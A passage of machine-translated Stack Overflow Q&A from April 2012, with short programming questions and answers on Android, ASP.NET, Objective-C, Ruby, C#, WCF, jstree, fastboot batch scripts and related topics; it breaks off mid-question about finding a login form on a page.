我想知道任何应用程序何时打开。明确地说，我正在制作阻止某些应用程序的服务（根据用户），我想检查应用程序是否类似于阻止列表中的任何应用程序并中止该应用程序进程。它需要root访问权限吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:05:20.900

您可以知道当前打开了哪些应用程序

```
ActivityManager manager = 
    (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
List<RunningAppProcessInfo> processes = manager.getRunningAppProcesses(); 
```

现在从**`processes`**找到您的应用程序并根据您的要求编写逻辑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:13:07.717

使用此代码

```
ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
List<RunningTaskInfo> runtasks = activityManager.getRunningTasks(Integer.MAX_VALUE);
for (int i = 0; i < runtasks.size(); i++) {
Log.d("Running task", "Running task: " + runtasks.get(i).baseActivity.toShortString() + "\t\t ID: " + runtasks.get(i).id);
} 
```

# asp.net - ASP.NET - 通过索引为 Session 对象赋值会引发错误

> ID：10069511
> 
> 赞同：1
> 
> 时间：2012-04-09T05:59:27.617
> 
> 标签：asp.net, session-state

当我写：

```
Session["conString"]= theConString; 
```

它完美地工作。但如果我尝试写：

```
Session[0] = the ConString; 
```

我得到“索引超出范围。必须是非负数并且小于集合的大小”错误。我知道这是数组的典型错误。这意味着我正在尝试设置不存在的对象的值。但是，我怎么可以通过指定会话对象的名称来做到这一点。有很多方法可以做到这一点： 1 给出一个字符串名称或数字索引。我需要这个选项，因为在其他页面上我不想记住字符串名称，而是想声明全局常量并使用这些常量名称访问它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:05:57.113

会话的容器在初始化时长度为 0，因此您尝试设置尚不存在的元素的值。而使用命名键将根据需要调整容器的大小。

# objective-c - Objective-C：方法名称随不同动作而变化

> ID：10069515
> 
> 赞同：1
> 
> 时间：2012-04-09T05:59:57.460
> 
> 标签：objective-c

有一个要求，我需要从其他类调用方法，但是方法名称会随着不同的动作而改变，如下所示：

```
NSArray *arrays = [NSArray arrayWithObjects:@"aaa", @"bbb", nil];
for ( NSString *array in arrays ){
blablabla.......
Aclass *abc = [[Aclass alloc] methodName%@:variable],array;
blablabla.......
} 
```

有没有办法在 Objective-C 中编写类似的代码？

谢谢！

更多信息：Aclass 中的方法名称如下：

```
-(NSArray *)procWithAAA:(NSInteger)aaaID 
```

谢谢！

Aclass 中的方法名称如下：

-(NSArray *)procWithAAA:(NSInteger)aaaID

---------根据你们的建议，我编写如下代码，但它不起作用--------

```
NSArray *arrays = [NSArray arrayWithObjects:@"aaa", @"bbb", nil];
for ( NSString *array in arrays ){

SEL customSelector = NSSelectorFromString([NSString stringWithFormat:@"procWith%@", array]);

if ([Sync respondsToSelector:customSelector]) {
                        Aclass * abc = [Aclass performSelector:customSelector:aaaID];
                    }else {
                        NSLog(@"## Class does not respond to %@", customSelector);
                    } 
```

Aclass * abc = [Aclass performSelector:customSelector:aaaID]; 这部分在 Objective-C 中是不允许的。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:03:48.793

您可以使用`[self performSelector:<#(SEL)#> withObject:<#(id)#>];`

```
 NSArray *selectorArray = [NSArray arrayWithObjects:@"abc",@"gcd", nil];

for (NSString *method in selectorArray) 
{
     [self performSelector:NSSelectorFromString(method) withObject:nil];
} 
```

带参数的方法，

```
NSArray *selectorArray = [NSArray arrayWithObjects:@"abc:",@"gcd:", nil];

for (NSString *method in selectorArray) 
{
     [self performSelector:NSSelectorFromString(method) withObject:@"test"];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:04:31.007

用于[`NSSelectorFromString`](https://developer.apple.com/library/ios/documentation/Cocoa/Reference/Foundation/Miscellaneous/Foundation_Functions/Reference/reference.html#//apple_ref/c/func/NSSelectorFromString)将字符串转换为`SEL`, 然后[`-[NSObject performSelector:]`](https://developer.apple.com/library/ios/documentation/Cocoa/Reference/Foundation/Protocols/NSObject_Protocol/Reference/NSObject.html#//apple_ref/occ/intfm/NSObject/performSelector%3a)或[`NSInvocation`](https://developer.apple.com/library/ios/documentation/Cocoa/Reference/Foundation/Classes/NSInvocation_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40003671)调用方法。

或者，如果可以[的话，使用键值编码](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/KeyValueCoding/Articles/KeyValueCoding.html#//apple_ref/doc/uid/10000107i)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:04:13.073

您可以使用该`NSSelectorFromString`功能。

```
SEL customSelector = NSSelectorFromString(@"selectorName");
if ([class respondsToSelector:customSelector]) {
    [class performSelector:customSelector];
}
else {
    NSLog(@"## Class %@ does not respond to %@", class, customSelector);
} 
```

有关选择器的更多信息可以在[文档](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocSelectors.html#//apple_ref/doc/uid/TP30001163-CH23-SW4)中找到。

# ruby - custom_require.rb:36：在“gem_original_require”中

> ID：10069516
> 
> 赞同：3
> 
> 时间：2012-04-09T05:59:58.587
> 
> 标签：ruby, ruby-on-rails-3, rubygems, jruby

虽然我安装了 gem，但出现以下错误

```
/rbing.rb:4: uninitialized constant RBing (NameError)
from /Users/bhushan/.rvm/rubies/ruby-1.8.7-p352/lib/ruby/site_ruby/1.8/rubygems/custom_require.rb:36:in `gem_original_require'
from /Users/bhushan/.rvm/rubies/ruby-1.8.7-p352/lib/ruby/site_ruby/1.8/rubygems/custom_require.rb:36:in `require'
from rbing.rb:3 
```

并且此错误仅特定于`Ruby 1.8.7`并且`Jruby`相同的文件适用于`1.9.2`. 什么可能被破坏？

rbing.rb 文件看起来像这样

```
require 'rubygems'
require 'rbing'
bing = RBing.new("APPID")

rsp = bing.web('infosys', :site => "linkedin.com")
puts rsp.web.results[0].url 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T21:41:31.073

在 Ruby 1.8 中，当前目录位于加载路径中。因此，当您说`require 'rbing'`，而不是使用 rbing gem 时，Ruby 将查看当前目录，查看一个名为 rbing.rb 的文件（即当前文件），然后重新加载它。因此，当它遇到对 的引用时`RBing`，Ruby 不知道该怎么做，因为它从未被定义过。（显然 JRuby 也会发生同样的事情，尽管这可能取决于您使用的版本。）您在 Ruby 1.9 中没有看到此错误，因为当前目录不在加载路径中，因此 Ruby 将跳过当前文件并需要 rbing gem。

您可以通过将此行放在文件顶部来确认这一点：

```
puts "#{__FILE__} was required" 
```

在1.9下，这应该说

```
rbing.rb was required 
```

在 1.8 和 JRuby 下，这应该说

```
rbing.rb was required
./rbing.rb was required 
```

（然后失败`uninitialized constant RBing`）。

**tl; dr：**将您的文件命名为其他名称。

# android - 是否可以使用 Android AudioRecord 类来录制人类听觉频率之外的音频？

> ID：10069522
> 
> 赞同：0
> 
> 时间：2012-04-09T06:00:51.170
> 
> 标签：android, audio, audio-recording

我知道我们可以在 Android 中使用[AudioRecord](http://developer.android.com/reference/android/media/AudioRecord.html)类来录制音频。我的问题是，是否可以使用此类录制超出人类听觉频率的音频？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T12:11:51.917

在我看来，可以捕获的频率是手机麦克风的功能，而不是 Android 实现的录制音频。我建议您在您正在查看的手机中找到麦克风的规格，然后查看其[频率响应图](http://en.wikipedia.org/wiki/Microphone#Measurements_and_specifications)以找出它可以捕获的确切频率。

此外，我认为应该可以通过普通麦克风捕获诸如狗哨之类的东西（不确定手机麦克风）。参考： http: [//forum.audacityteam.org/viewtopic.php?f=16 &t=5478](http://forum.audacityteam.org/viewtopic.php?f=16&t=5478)

> 大多数动圈麦克风的频率响应在 15 到 16 kHz 左右，电容式麦克风在 18 到 20 kHz 左右。

# javascript - 在 Rails 3 中声明 Javascript 变量时出错

> ID：10069525
> 
> 赞同：-1
> 
> 时间：2012-04-09T06:01:05.600
> 
> 标签：javascript, ruby-on-rails-3.1

在 Javascript 和 Rails 3.1 中声明变量时出现错误。如果我将以下代码放在我的 index.html.erb 上，则没有任何问题：

```
<div id='show_time_id' style="background-color: #eee">

<script type="text/javascript">
function updateClock ( )
{
var currentTime = new Date ( );

var currentHours = currentTime.getHours ( );
var currentMinutes = currentTime.getMinutes ( );
var currentSeconds = currentTime.getSeconds ( );

.......

// Update the time display
document.getElementById("clock").firstChild.nodeValue = currentTimeString;
}
</script>

<script type="text/javascript">
$(document).ready(
    function(){
        setInterval('updateClock()', 1000 )
    });
</script>
</div>

<div style="width: 10em; text-align: right; margin: 20px auto;">
<span id="clock">&nbsp;</span>
</div> 
```

但是，如果我将代码放入 assets\javascript\clock.js 文件中，然后放入`<%= javascript_include_tag 'clock' %>` 我的 index.html.erb 文件中，我会在错误控制台中收到此错误：

> 语法错误
> [http://localhost:3000/assets/clock.js?body=1](http://localhost:3000/assets/clock.js?body=1)
> var currentTime = new Date ( );

这不是很重要的事情，因为我可以将代码留在 index.html.erb 中，但我还是想知道。知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:20:28.337

I think you have written function inside script tag in js file... write function alone do not inside the script tags...

# windows - 为什么“程序文件”是两个词？

> ID：10069526
> 
> 赞同：5
> 
> 时间：2012-04-09T06:01:05.860
> 
> 标签：windows, command-line, history

`Program Files`Windows 安装中的文件夹在标题中有空格这一事实是否有历史或原因？

为什么不叫它`Programs`或者`Installations`是*一个*词（命令行访问，你好）？看来这一定是有充分理由的……有人知道吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T07:03:27.323

Raymond Chen 在[这篇 TechNet 文章](http://technet.microsoft.com/en-us/magazine/2006.08.windowsconfidential.aspx)中解释说，这是一个自愿决定：

*   *程序*是应用程序，被最终用户视为单个单元，尽管它们通常包含许多文件。它们位于“开始”菜单中，可以轻松访问、排序、过滤等。

*   *程序文件*是制作程序的单个文件。它们只不过是实现细节，最终用户不应该被它们打扰，甚至不应该知道它们的存在。因此，它们位于一个名为`Program Files`而不是`Programs`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:31:04.463

名称并不重要，只要它的描述性足以传达存储在那里的内容即可。Tab-completion 使命令行访问就像更改到任何其他目录一样容易。如果您真的不喜欢它，您可以更改默认的 %ProgramFiles% 路径，运行良好的应用程序不会有问题。

我猜典型用户不会有任何问题，因为他们通常会使用 Windows 资源管理器访问该目录，并且使用命令行的人很可能足够精明地导航到它。

关于 FAT 兼容性，对该名称的最大影响是长度，而不是空间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T07:12:08.623

我不确定做出的实际原因或决定，但它确实显示了“雷德蒙德现实扭曲场”是如何起作用的。引入此功能时（在 Windows 95 中）有一个概念，即 Windows 可以愉快地处理文件夹名称中的空格。从技术上讲，它可以，但它会导致当时和此后编写的任何应用程序出现巨大问题。

Windows 有一个东西，你会在文件名中得到一个 ~，所以它可以与不期望任何空格的旧应用程序一起使用

```
c:\my long folder name\file.txt 
```

将会

```
c:\mylong~1\file.txt 
```

，但这并不总是有效。如果两个文件被命名为类似的东西，我会记得使用 ~ 符号获取错误的文件。

我认为这是微软的一个例子，他说我们的文件夹名称中当然可以有空格，一切都会正常工作，而不关心现实。

如果不是这样，那我们为什么要从

*   文档和设置

到

*   用户

并且新的 ProgramData 文件夹没有空格。这是一个糟糕的决定，但已经存在太久了，无法改变。

# iframe - 如何在phonegap的视图中打开链接？

> ID：10069527
> 
> 赞同：0
> 
> 时间：2012-04-09T06:01:22.363
> 
> 标签：iframe, cordova, kendo-ui

我想在视图中打开一个链接，例如[http://google.com](http://google.com)。我用 iframe src="" 试过，但是当我在 iphone 上运行它时，它会在 webview 中打开，所以我看不到页眉和页脚。

```
 <div data-role="view" data-layout="overview-layout" data-title="More">    
    <div data-role="content" >
        <div class="km-scroll-container" > 
            <ul id="menuList" class="item-list km-listview km-listgroup">
                <li>
                    <ul data-role="listview">
                        <li><a class="details-link" data-role="listview-link" href="">xxx</a></li>
                          <li><a class="details-link" data-role="listview-link" href="#moreinfo">yyy</a></li>

                        <li></li>

                    </ul>
                </li>
            </ul>
        </div>
    </div>        
</div>

    <div data-role="view" data-layout="overview-layout" id="moreinfo" data-title="More Info">   
    <div data-role="content">
        <div class="km-scroll-container">
           <iframe width="100%" height="100%" frameborder="0" scrolling="no" marginheight="0"
                marginwidth="0" src="http://www.google.com">
            </iframe>    
        </div>
    </div> 
```

当我打开此页面时，它会直接在 webview 中打开 google，我的意图是在单击“yyy”时打开。我也需要它在 iphone 中运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:53:57.293

下载 url 的内容并在按钮上单击加载视图

```
 NSData *d = [NSData dataWithContentsOfURL:[NSURL URLWithString:@"http://www.google.com"]];
    NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
    //load string s in view
    textView.text = s; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T14:00:17.573

如果您可以使用 javascript，请尝试使用

```
window.open("www.google.com"); 
```

在您的 html 中将是：

```
<iframe width="100%" height="100%" frameborder="0" scrolling="no" marginheight="0"
                marginwidth="0" onclick="window.open("www.google.com")"> 
```

# android - 我可以将传入的消息存储在 android 的服务器上吗？

> ID：10069528
> 
> 赞同：1
> 
> 时间：2012-04-09T06:01:24.123
> 
> 标签：android, sql-server-2008, sms, broadcastreceiver, android-service

我对传入消息是否可以直接在android中存储在服务器上进行了研发。我得出结论，我们应该使用广播接收器和 Web 服务来接收传入的消息并将其直接存储在服务器上。这是正确的解决方案还是有其他解决方案？

我只是想将传入的消息存储在服务器上，并且发件人的数量像 ex 一样固定。10 个发件人。并且数据也将固定......那么还有另一种方法可以实现这一目标吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T08:15:00.630

你虽然是正确的。我们应该使用广播以及网络服务。当有新消息到达时，我们应该在 HTTP 之上进行 Web 服务调用。

# rest - JBoss RESTEasy 客户端和 Servlet

> ID：10069536
> 
> 赞同：1
> 
> 时间：2012-04-09T06:02:38.343
> 
> 标签：rest, resteasy

我的 RESTEasy 服务确实有一个使用 cookie 参数的方法：

```
public interface SimpleService
{
  public String test(@CookieParam("param") String param);
} 
```

现在我正在尝试将我的 SimpleService 与 RESTEasy 客户端框架一起使用，它是我的 Servlet 中的代理工厂。但是，如何正确“转发”cookie 参数？现在，我需要手动遍历请求的 cookie 数组，并手动将 cookie 的值提供给 test(..) 函数调用。阅读[http://docs.jboss.org/resteasy/docs/2.3.0.GA/userguide/html/RESTEasy_Client_Framework.html](http://docs.jboss.org/resteasy/docs/2.3.0.GA/userguide/html/RESTEasy_Client_Framework.html)上的 RESTEasy 客户端框架文档：

@CookieParam 与其服务器端对应的镜像工作相反，并创建一个 cookie 标头以发送到服务器。如果您分配自己的 javax.ws.rs.core.Cookie 对象并将其作为参数传递给客户端代理方法，则不需要使用 @CookieParam。客户端框架了解您正在将 cookie 传递给服务器，因此不需要额外的元数据。

所以我很好奇这对我的案子意味着什么？如何在我的 servlet 中正确使用 RESTEasy 客户端框架和 cookie 参数？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-03T17:28:36.780

自从您问以来已经有一段时间了，您现在可能已经解决了这个问题，但这里有一些东西供将来参考：

如果您希望使用客户端框架访问从服务器发送的 cookie，我认为您会遇到遍历标头的问题（`ClientResponse`就像您今天所做的那样？）。

但是，如果您想了解其`@CookieParam`工作原理，使用您当前的界面制作客户端，它会是这样的：

```
SimpleService service = ProxyFactory.create(SimpleService.class, "the://url:to/your/service");
service.test("this text becomes a cookie called 'param' in the request"); 
```

该 cookie 将作为字符串输入参数提供给服务器端实现。

```
@Get
@Path("/test")
public String test(@CookieParam("param") cookie) {
    log(cookie); // would print: this text becomes a cookie called 'param' in the request
    return "seems legit";
} 
```

希望这对您、未来的读者或两者都有帮助！

# c# - C# 动态类型和条件

> ID：10069537
> 
> 赞同：2
> 
> 时间：2012-04-09T06:02:45.563
> 
> 标签：c#

我已经开始使用 C# 4.0 并且喜欢动态关键字。但是，我不确定我在做什么可以被认为是好的做法。请看下面的代码：

```
static void Main()
{
    NoobSauceObject noob = new NoobsauceObject();

    dynamic theReturnType = noob.do(param);

    if (theReturnType.GetType().ToString().Contains("TypeOne"))
        theReturnType.ExecuteMethodOfTypeOne();
    else if (theReturnType.GetType().ToString().Contains("TypeTwo"))
        theReturnType.ExecuteMethodOfTypeTwo();
    else
        throw new ArgumentException("");
} 
```

有没有更好的方法来做到这一点？我发现上述方法非常简单并且一直在使用它，但不确定从长远来看我是否应该坚持使用它。

编辑：如果我要使用 .NET 3.5 或更低版本或不使用 dynamic 关键字来做同样的事情，那么什么是好的实现？

提前致谢！！:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T06:09:09.407

在我看来，您只是在两种不相关的类型之间进行类型测试。如果可能的话，我会在这里看看多态性，或者至少：实现一个通用接口。但是，以下内容也可以：

```
var typeOne = theReturnType as TypeOne;
if(typeOne != null) typeOne.ExecuteMethodOfTypeOne();
else {
    var typeTwo = theReturnType as TypeTwo;
    if(typeTwo != null) typeTwo.ExecuteMethodOfTypeTwo();
    else throw new ArgumentException("somethingMeaningful");
} 
```

但是，我的首选选项是：

```
var typed = theReturnType as ISomeInterface;
if(typed != null) typed.SomeMethod();
else throw new ArgumentException("somethingMeaningful"); 
```

在哪里`TypeOne`并且`TypeTwo`可能使用显式接口实现在其 API 上公开该方法：

```
public class TypeOne : ISomeInterface {
    void ISomeInterface.SomeMethod() { ExecuteMethodOfTypeOne(); }
    public void ExecuteMethodOfTypeOne() {
        // ...
    }
} 
```

（同样`TypeTwo`）

我看不出`dynamic`这里没有真正的用处；对于 , 的返回类型`noob.do(param)`，`object`在第一个示例中会很好 - 或者`ISomeInterface`会更好。

# c# - 可访问性不一致

> ID：10069538
> 
> 赞同：14
> 
> 时间：2012-04-09T06:02:58.817
> 
> 标签：c#, winforms

我收到以下错误

> 可访问性不一致：参数类型“Db.Form1.ConnectionString”比方法“Db.Form1.BuildConnectionString(Db.Form1.ConnectionString)”更难访问

```
//Name spaces
using System;
using System.Collections.Generic;
using System.ComponentModel;
 using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
 using System.Windows.Forms;
using Microsoft.VisualBasic;
using System.Collections;
using System.Diagnostics;
using System.Data.OleDb;
using System.IO;
using System.Drawing.Printing;

 //
  namespace Db
{
  public partial class Form1 : Form
  {
     public Form1()
     {
        InitializeComponent();
     }
     public void SetBusy()
    {
        this.Cursor = Cursors.WaitCursor;
        Application.DoEvents();
    }
    public void SetFree()
    {
        this.Cursor = Cursors.Default;
        Application.DoEvents();
    }
   //connection string into parts
    struct ConnectionString
    {
        public string Provider;
        public string DataSource;
        public string UserId;
        public string Password;
        public string Database;
    }
  //Declare
    public string BuildConnectionString(ConnectionString connStr) ------> getting error here
    {
        string[] parts = new string[5];
        parts[0] = "Provider=" + connStr.Provider;
        parts[1] = "Data Source=" + connStr.DataSource;
        parts[2] = "User Id=" + connStr.UserId;
        parts[3] = "Password=" + connStr.Password;
        parts[4] = "Initial Catalog=" + connStr.Database;
        return string.Join(";", parts);
    }
    // settings 
    public bool IsValidConnectionForPrinting()
    {
        SetBusy();

        ConnectionString connStr = new ConnectionString();
        connStr.Provider = cboProvider.Text;
        connStr.DataSource = cboDataSource.Text;
        connStr.UserId = txtUserId.Text;
        connStr.Password = txtPassword.Text;
        connStr.Database = cboDatabase.Text;
       //connection string to database 
        string connectionString = BuildConnectionString(connStr);
        OleDbConnection conn = new OleDbConnection(connectionString);
        try
        {
            conn.Open();
            OleDbCommand cmd = conn.CreateCommand;
            cmd.CommandType = CommandType.TableDirect;
            cmd.CommandText = "vw_pr_DL";
            cmd.ExecuteScalar();
            cmd.CommandText = "vw_pr_VR";
            cmd.ExecuteScalar();
            //cmd.CommandText = "vw_pr_VR"
            //cmd.ExecuteScalar()
            conn.Close();
        } 
   //Exception messages
        catch (Exception ex)
        {
            SetFree();
            if (ex.Message.StartsWith("Invalid object name"))
            {
                MessageBox.Show(ex.Message.Replace("Invalid object name", "Table or view not found"), "Connection Test");
            }
            else
            {
                MessageBox.Show(ex.GetBaseException().Message, "Connection Test");
            }
            return false;
        }
        SetFree();
        return true;
    } 
```

// 当用户点击测试按钮时

```
private void btnConnTest_Click(object sender, EventArgs e)
{

if (IsValidConnectionForPrinting())
    {
         MessageBox.Show("Connection succeeded", "Connection Test");
    }
} 
```

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-04-09T09:13:13.243

如此处所述，如果未指定访问修饰符，则默认情况下类和结构是私有的[。](http://msdn.microsoft.com/en-us/library/ms173121.aspx)您将结构定义为：

```
struct ConnectionString
{
    public string Provider;
    public string DataSource;
    public string UserId;
    public string Password;
    public string Database;
} 
```

您需要将其定义为：

```
public struct ConnectionString
{
    public string Provider;
    public string DataSource;
    public string UserId;
    public string Password;
    public string Database;
} 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-04-09T06:08:30.950

您的`ConnectionString`类型不是`public`，但是，公共类的公共方法正在使用它作为参数。您还必须创建 type `public`，例如：

```
// If it's a class
public class ConnectionString { ... } 
```

# android - 从批处理文件中快速启动 getvar

> ID：10069543
> 
> 赞同：0
> 
> 时间：2012-04-09T06:03:23.047
> 
> 标签：android, batch-file, command-line, fastboot

我试图从批处理文件中获取某些快速启动变量。我正在使用类似的东西：

```
for /f "tokens=2 delims=:" %%a in ('fastboot.exe getvar version-bootloader') do @echo version is %%a 
```

但我在命令行上得到输出，而不是在变量 %%a 中。命令“fastboot.exe getvar version-bootloader”在命令行中完美运行。我也尝试过：

```
fastboot.exe getvar version-bootloader >> temp.txt 
```

但 temp.txt 始终为空，我在命令行上接收输出，而不是文件。有没有替代方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-22T10:20:05.907

fastboot 输出定向到错误流，您可以通过添加将错误流定向到标准流`2>&1`

1.  您的脚本将得到两行，因为 fastboot getvar 随着时间的推移返回额外的行。
2.  您的脚本使用前导空格解析版本，您应该在分隔符中添加一个空格（这是默认设置，但是当您给出分隔符时，它会被覆盖）

你应该使用：

```
for /f "tokens=2 delims=: " %%a in ('fastboot.exe getvar version-bootloader 2^>^&1 ^| findstr version') do @echo version is %%a 
```

# javascript - 如何将节点标识为根节点？

> ID：10069548
> 
> 赞同：3
> 
> 时间：2012-04-09T06:04:42.673
> 
> 标签：javascript, jquery, jquery-plugins, jstree

我想在现有节点内部或之下创建一个节点，具体取决于它是否是根节点。（树小部件通常是树列表或没有可见根节点的树。）

我试过get_parent，但我怎么知道它是否是根节点？

```
var parent = $("#demo1").jstree('_get_parent', $("#foo"));
var node = $("#demo1").jstree('_get_node', $("#foo")); 
```

让我感到困惑的是 get_node 似乎返回与 get_parent 相同的对象。

我正在使用 jstree_pre1.0_fix_1。

**编辑：**

我最终检查了父母的父母的已知ID。

```
var node = $(e.replyto);
if (node.length) {
  if (node.parent().parent().attr('id') == 'demo1') {
    $("#demo1").jstree("create_node", node, 'last',{'attr': {'id':e.id}, 'state':'open', 'data': e.data}) ;
  } else {
    $("#demo1").jstree("create_node", node, 'after',{'attr': {'id':e.id}, 'state':'open', 'data': e.data}) ;
  }
} else {
    $("#demo1").jstree("create_node", -1, 'after',{'attr': {'id':e.id}, 'state':'open', 'data': e.data});
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-03-23T14:48:20.460

您可以在节点上调用[get_parent() 。](http://www.jstree.com/api/#/?f=get_parent(obj))如果它返回“#”，则该节点是根节点。例如：

```
var node = ...;

if($('#demo1').jstree(true).get_parent(node) == '#') {
    // node is a root node
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T07:39:45.357

这不是理想的解决方案，但您可以在参数中使用`_get_children`with`-1`来获取所有根节点并测试您的节点是否在列表中。

```
._get_children ( node )
  Use -1 to return all root nodes. 
```

（来自[http://www.jstree.com/documentation/core](http://www.jstree.com/documentation/core)）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-16T03:48:28.420

我一直在为此苦苦挣扎，因为我正在尝试使用上下文菜单插件。我不希望用户能够创建新的根节点。我只想让他们创建子节点。（根节点代表当前用户所属的组，由管理员预先设置）。我的第一个困惑是`_get_children`返回一个带有`length`属性的对象。它不是一个数组，但它具有`length`与实际根节点数量正确对应的属性。查看底层代码，该`jstree` `_get_children`方法使用 jQuery 的`children`方法，该方法返回索引为 0、1、2 等的子节点以及其他 jQuery 属性和方法。我发现只提取节点数组并使用它很方便`indexOf`检查当前节点是否为根节点。所以，这是我的上下文菜单配置`items`属性的一个片段：`jstree`

```
'items': function(node){
    var rootChildren = this._get_children(-1), 
    rootNodes = [], 
    i;
    //rootChildren is now a fancy jQuery object with the child nodes assigned
    //to keys 0, 1 etc.
    //Now create a simple array
    for(i = 0; i < rootChildren.length; i += 1){
        rootNodes[i] = rootChildren[i];
    }
    //We can now use indexOf to check if the current node is in that array
    //Note again that node is a fancy jQuery object, the actual DOM element
    //is stored in node[0]
    console.log(rootNodes.indexOf(node[0]) > -1);
    //code here to add whatever items you want to the context menu.
} 
```

如果您在树周围右键单击，您将`true`在控制台窗口中看到根节点和`false`层次结构较低的任何节点。请注意，对于低于 8 的 IE（我认为），您需要提供一个`indexOf`方法，`Array`因为早期版本的 IE 不`indexOf`作为本机方法提供。

# wcf - 如何检测客户端是否在 wcf 中进行回调？

> ID：10069549
> 
> 赞同：3
> 
> 时间：2012-04-09T06:04:45.000
> 
> 标签：wcf, wcf-client

我有一个 WCF 实现，并将其托管在 Windows 服务（自托管）中。我使用回调合约来触发客户端的一些事件。
问题是我如何确定或检查客户端是否仍然活着以触发其回调事件。有没有检查机制？我使用.NET 3.5。
谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T09:25:18.253

没有任何内置的方法。

如果客户端无法处理回调，那么您的服务将在尝试调用客户端回调时挂起或抛出异常（取决于回调通道的状态）。

这个问题的一种可能的解决方案是[here](https://stackoverflow.com/q/1981113/569662)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T14:55:29.127

我解决同样问题的方法是创建一个“DefaultCallback”类，它实现回调接口并且什么都不做（它当然不会抛出任何 Not ImplmentedException）。然后你可以写一些这样的代码：

```
 private IServiceCallBack[] GetCallBack()
    {
        var returnValue = new IServiceCallBack[1];

        var com = (ICommunicationObject)(returnValue[0] = OperationContext.Current.GetCallbackChannel<IServiceCallBack>());

        com.Closing += new EventHandler((object sender, EventArgs e) =>
        {
            returnValue[0] = new DefaultCallBack();
        });

        com.Faulted += new EventHandler((object sender, EventArgs e) =>
        {
            returnValue[0] = new DefaultCallBack();
        });

        return returnValue;
    } 
```

因此，每当回调客户端处于关闭或故障状态时，它都会被一个不执行任何操作的兼容对象替换。

# testing - 如何断言网站上存在的视频？

> ID：10069556
> 
> 赞同：0
> 
> 时间：2012-04-09T06:05:40.793
> 
> 标签：testing, selenium, automation

我想验证网站（例如 YouTube）上的视频是否存在。现在的问题是我无法找到视频元素。我使用过 HTML 和 x-path。那么如何定位元素呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T04:09:02.207

我想视频应该包含在一个应该有 ID 或名称的 Div 中？您是否尝试过仅搜索 Div 并断言它是否有任何元素？我认为需要更多信息才能获得有用的答案。

# java - 在linux、mac和windows中使用JNI

> ID：10069560
> 
> 赞同：2
> 
> 时间：2012-04-09T06:06:14.257
> 
> 标签：java, c++, windows, linux, java-native-interface

我有一个完全用 cpp 编写的应用程序，现在我需要在 java 中迁移它，但我不需要将处理逻辑从 cpp 转换为 java，所以我决定使用 JNI。应用程序必须在 linux、mac 和 windows 环境下运行。

但是我发现对于 windows，我们需要为 jni 指定 .dll 文件，对于 linux .so 文件，我不知道对于 mac。

现在我的环境是windows 7。

所以我的问题是：

1.  我可以编写这样一种应用程序，即我需要为所有三个平台提供任何 .dll、.so 文件吗？

2.  如何做到这一点？有什么指导方针吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-12-24T11:21:48.770

在您的 java 类中，您将拥有

System.loadLibrary("foo")

然后你只需要在每个系统上编译一个库，例如 Linux 的 libfoo.so 和 Windows 的 foo.dll

# ios - 奇怪的 Xcode 签名问题

> ID：10069562
> 
> 赞同：1
> 
> 时间：2012-04-09T06:06:29.157
> 
> 标签：ios, xcode, code-signing

我在 Xcode 4.3.2 中有一个奇怪的问题，我正在开发一个使用推送通知的应用程序，并且我在配置门户和钥匙链中设置了所有需要的东西。现在我开始签署我的代码，在我的 Xcode 中我没有看到配置文件，也没有看到我应该选择配置文件的行右侧的小箭头，而是我得到了这个框可以在我附在下面的图片中看到。

![xCode 图像](../Images/9613bf997f0336a45567d5c8d50cd55e.png)

有谁知道如何解决它，因为现在我需要手动输入这个框。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:17:30.310

The box is shown for `Code Signing Entitlements` and not for choosing profiles. The ones that you are looking for are right below your selected item.

# javascript - 根据内容查找登录表单

> ID：10069564
> 
> 赞同：0
> 
> 时间：2012-04-09T06:06:38.697
> 
> 标签：javascript, jquery, html, forms

基本上，当HTML 文档中有多个时，我想找出**登录表单。**`forms`我的猜测如下：如果我能识别出类似`'forgot your password'`或`'Remember me'`或`'keep me signed in'` 属于哪个表单字符串，那么它可能是登录表单，因为这些字符串/链接出现在密码字段之后。

有什么办法可以找出哪个表单包含这些字符串/链接，然后在我的应用程序中使用该表单的名称或 ID？

更新：我使用以下代码获取包含字符串“忘记密码”的表单 ID，但它没有返回任何内容。

```
